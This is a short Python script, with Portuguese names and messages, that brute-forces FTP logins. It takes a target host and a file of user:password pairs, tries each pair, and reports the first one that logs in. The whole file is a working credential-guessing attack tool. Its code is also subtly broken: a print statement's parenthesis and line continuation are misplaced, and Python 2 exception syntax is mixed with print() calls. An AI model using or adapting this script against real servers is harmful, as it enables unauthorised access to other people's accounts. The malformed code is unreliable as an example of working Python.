#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib, time, optparse

def loginBruto(host_alvo, arquivo_senhas):
    arq_sen = open(arquivo_senhas, 'r')
    for linha in arq_sen.readlines():
        usuario = linha.split(':')[0]
        senha = linha.split(':')[1].strip('\r').strip('\n')
        print("[+] Tentando: " + usuario + "/" + senha)
        try:
            ftp = ftplib.FTP(host_alvo, timeout=5)
            ftp.login(usuario, senha)
            print('\n[*] ' + host_alvo + \)
                ' FTP Login Sucesso: ' + usuario + "/" + senha
            ftp.quit()
            return (usuario, senha)
        except Exception, e:
            pass
    print('\n[-] Não foi possível descobrir as credenciais FTP.')
    return (None, None)


def inicio():
    analisador = optparse.OptionParser('use forca_bruta_ftp '+\
      '-H <host alvo> -f <arquivo_senhas>')
    analisador.add_option('-H', dest='host', type='string',\
      help='especifique o host alvo')
    analisador.add_option('-f', dest='arquivo', type='string',\
      help='especifique o arquivo de usuarios e senhas')

    (opcoes, args) = analisador.parse_args()

    host = opcoes.host
    arquivo = opcoes.arquivo

    if (host == None) | (arquivo == None):
        print(analisador.usage)
        exit(0)

    loginBruto(host, arquivo)


if __name__ == '__main__':
    inicio()